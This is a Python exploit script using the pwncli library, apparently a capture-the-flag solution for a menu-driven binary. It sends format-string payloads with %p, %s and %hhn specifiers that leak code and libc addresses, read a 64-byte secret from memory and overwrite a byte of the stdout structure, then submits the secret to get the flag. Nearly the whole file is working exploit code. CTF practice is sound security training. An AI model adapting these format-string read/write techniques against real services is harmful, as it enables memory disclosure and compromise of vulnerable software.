#!/usr/bin/python3
from pwncli import *
cli_script()

if gift['debug']:
    libc = gift['libc']
elif gift['remote']:
    libc = ELF('/root/LibcSearcher/libc-database/other_libc_so/libc-2.23.so')


def leak(p:tube):
    p.sendlineafter(">>", "1")

# offset = 8
def fmt_attack(p:tube, fmt_str):
    p.sendlineafter(">>", "2")
    p.send(fmt_str)


def get_flag(p:tube, secret):
    p.sendlineafter(">>", "3")
    p.sendafter("If you can open the door!\n", secret)


def attack(p:tube):
    p.recvuntil("tell me the time:")
    for _ in range(3):
        p.sendline(str(0xdeadbeef))
    payload = "%7$hhn%17$p,%23$p\n"
    fmt_attack(p, payload)
    leak_msg = p.recvline()
    code_addr, libc_addr = leak_msg.strip().split(b',')
    code_addr = int16(code_addr.decode())
    libc_addr = int16(libc_addr.decode())
    log_address("code_addr", code_addr)
    log_address("libc_addr", libc_addr)
    stop()
    code_base_addr = code_addr - 118 - 0xfb6
    libc_base_addr = libc_addr - libc.sym['__libc_start_main'] - 240
    log_address("code_base_addr", code_base_addr)
    log_address("libc_base_addr", libc_base_addr)

    # stdout_addr = libc.sym['_IO_2_1_stdout_']
    secret_addr = code_base_addr + 0x202060
    stdout_flag_addr = libc_base_addr + libc.sym['_IO_2_1_stdout_'] + 112

    # payload = b"%2c%10$hhn%11$sa" + p64(stdout_flag_addr)+ p64(secret_addr)
    payload = flat(["%7$hhn%d,%10$saa", secret_addr, "\n"])
    fmt_attack(p, payload)
    leak_msg = p.recvline()
    secret_msg = leak_msg[leak_msg.find(b',')+1:-1]

    if len(secret_msg) < 0x40:
        p.close()
        sys.exit()
    secret_msg = secret_msg[:0x40]
    info("secret msg: {}".format(secret_msg))
    stop()

    payload = flat(["aa%9$hhn", stdout_flag_addr])
    fmt_attack(p, payload)
    stop()
    get_flag(p, secret_msg)

    p.interactive()


attack(gift['io'])



